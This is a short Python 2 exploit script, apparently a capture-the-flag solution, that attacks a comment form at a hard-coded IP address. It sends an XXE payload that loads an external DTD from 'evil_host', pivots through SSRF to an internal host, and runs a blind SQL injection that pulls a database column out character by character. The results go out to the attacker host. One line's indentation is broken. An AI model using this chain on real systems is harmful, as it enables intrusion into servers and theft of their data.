import requests
url = 'http://39.107.33.75:33899/common.php'
s = requests.Session()
result = ''
data = {
        "name":"evil_man",
        "email":"testabcdefg@gmail.com",
        "comment":"""<?xml version="1.0" encoding="utf-8"?>
                <!DOCTYPE root [
                <!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">
                %dtd;]>
                """
}

for i in range(0,28):
        for j in range(48,123):
                f = open('./evil.dtd','w')
            payload2 = """<!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">
                <!ENTITY % all "<!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">
                %all;
                %send;""".format('_'*i+chr(j)+'_'*(27-i))
                f.write(payload2)
                f.close()
                print 'test {}'.format(chr(j))
                r = s.post(url,data=data)
                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':
                        result += chr(j)
                        print chr(j)
                        break
print result
